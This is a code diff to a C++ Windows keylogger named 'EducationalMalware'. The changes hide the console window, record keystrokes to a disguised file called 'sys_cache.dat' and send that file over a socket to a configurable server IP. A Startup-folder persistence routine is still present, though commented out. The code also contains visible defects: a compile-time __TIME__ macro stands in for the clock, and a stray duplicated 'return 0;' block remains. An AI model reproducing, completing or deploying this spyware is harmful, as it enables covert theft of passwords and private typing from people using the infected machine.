@@ -1,4 +1,6 @@
 #include <iostream>
+#include <ws2tcpip.h>
+#include <string>
 #include <windows.h>
 #include <initguid.h> // Important: Ensures GUIDs are defined
 #include <objbase.h>
@@ -23,8 +25,8 @@ std::string hiddenDir = "C:\\ProgramData\\EducationalMalware\\";
 std::string hiddenExePath = hiddenDir + "Hidden.exe";
 std::string startupShortcutName = "EducationalMalware";
 
-#define CLIENT_IP "localhost" // Change this to the client's actual IP
-#define CLIENT_PORT 22        // Change this to the port where Ncat is listening
+#define SERVER_IP "127.0.0.1" // Change this to your server's IP
+#define SERVER_PORT 5000      // Choose a safe port
 
 std::string getCurrentTime()
 {
@@ -36,28 +38,45 @@ std::string getCurrentTime()
     return std::string(buffer);
 }
 
-// Send log to server
-void sendLogs(const std::string &logContent)
+void sendLogs(const std::string &filename)
 {
     WSADATA wsa;
     SOCKET s;
     struct sockaddr_in server;
 
-    WSAStartup(MAKEWORD(2, 2), &wsa);
-    s = socket(AF_INET, SOCK_STREAM, 0);
+    std::ifstream logFile(filename, std::ios::binary);
+    if (!logFile)
+    {
+        return;
+    }
 
-    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Replace with server IP
+    std::string logContent((std::istreambuf_iterator<char>(logFile)), std::istreambuf_iterator<char>());
+    logFile.close();
+
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+    {
+        return;
+    }
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s == INVALID_SOCKET)
+    {
+        WSACleanup();
+        return;
+    }
+
     server.sin_family = AF_INET;
-    server.sin_port = htons(22);
-    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == 0)
+    server.sin_port = htons(SERVER_PORT);
+    server.sin_addr.s_addr = inet_addr(SERVER_IP);
+
+    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR)
     {
-        send(s, logContent.c_str(), logContent.length(), 0);
-        std::cout << "Log sent to server.\n";
+        closesocket(s);
+        WSACleanup();
+        return;
     }
-    else
-    {
-        std::cerr << "Failed to send log to server.\n";
-    }
+
+    send(s, logContent.c_str(), logContent.length(), 0);
 
     closesocket(s);
     WSACleanup();
@@ -66,49 +85,45 @@ void sendLogs(const std::string &logContent)
 // Function to simulate keylogging
 void logKeys()
 {
-    std::ofstream logFile("keylog.txt", std::ios::app);
-    char c;
+    static std::ofstream logFile("sys_cache.dat", std::ios::app); // Static to retain state
 
-    while (true)
+    for (unsigned char key = 8; key < 255; key++)
     {
-        for (c = 8; c <= 255; c++)
+        if (GetAsyncKeyState(key) & 0x8000)
         {
-            if (GetAsyncKeyState(c) & 0x8000)
-            {
-                logFile << c;
-                logFile.flush();
-            }
+            logFile << key;
+            logFile.flush();
         }
     }
 }
 
-// Function to add program to startup
-void addToStartup(const std::string &exePath)
-{
-    char startupPath[MAX_PATH];
-    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
-    {
-        std::string shortcutPath = std::string(startupPath) + "\\" + startupShortcutName + ".lnk";
-
-        CoInitialize(NULL);
-        IShellLink *shellLink = NULL;
-        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void **)&shellLink)))
-        {
-            shellLink->SetPath(exePath.c_str());
-
-            IPersistFile *persistFile = NULL;
-            if (SUCCEEDED(shellLink->QueryInterface(IID_IPersistFile, (void **)&persistFile)))
-            {
-                WCHAR widePath[MAX_PATH];
-                MultiByteToWideChar(CP_ACP, 0, shortcutPath.c_str(), -1, widePath, MAX_PATH);
-                persistFile->Save(widePath, TRUE);
-                persistFile->Release();
-            }
-            shellLink->Release();
-        }
-        CoUninitialize();
-    }
-}
+// Function to add program to startup (commented out for now)
+// void addToStartup(const std::string &exePath)
+//{
+//    char startupPath[MAX_PATH];
+//    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
+//    {
+//        std::string shortcutPath = std::string(startupPath) + "\\" + startupShortcutName + ".lnk";
+//
+//       CoInitialize(NULL);
+//        IShellLink *shellLink = NULL;
+//        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void **)&shellLink)))
+//        {
+//            shellLink->SetPath(exePath.c_str());
+//
+//            IPersistFile *persistFile = NULL;
+//            if (SUCCEEDED(shellLink->QueryInterface(IID_IPersistFile, (void **)&persistFile)))
+//            {
+//                WCHAR widePath[MAX_PATH];
+//                MultiByteToWideChar(CP_ACP, 0, shortcutPath.c_str(), -1, widePath, MAX_PATH);
+//                persistFile->Save(widePath, TRUE);
+//                persistFile->Release();
+//            }
+//            shellLink->Release();
+//        }
+//        CoUninitialize();
+//    }
+//}
 
 // Function to move and hide the file
 // void hideFile()
@@ -127,31 +142,35 @@ void addToStartup(const std::string &exePath)
 // Function to run in background
 void runInBackground()
 {
-    FreeConsole(); // Hides console window
+    HWND hWnd = GetConsoleWindow();
+    if (hWnd != NULL)
+        ShowWindow(hWnd, SW_HIDE);
 }
 
 // Main function
 int main()
 {
+    runInBackground();                // Call the function to hide the console
     std::string targetTime = "23:59"; // Time to send logs
     std::string lastCheckedTime = "";
 
     while (true)
     {
-        std::string currentTime = getCurrentTime();
-        void runInBackground();
-        void logKeys();
+        std::string currentTime = __TIME__; // Get system time
         // Send logs only at the target time, once per day
         if (currentTime == targetTime && lastCheckedTime != targetTime)
         {
-            sendLogs();
+            sendLogs("sys_cache.dat");
             lastCheckedTime = targetTime; // Prevents duplicate sending
         }
-
+        logKeys(); // Keep logging keys continuously
         // Light delay without blocking execution
         for (volatile int i = 0; i < 1000000; i++)
             ;
     }
+
+    return 0;
+}
 
     return 0;
 }
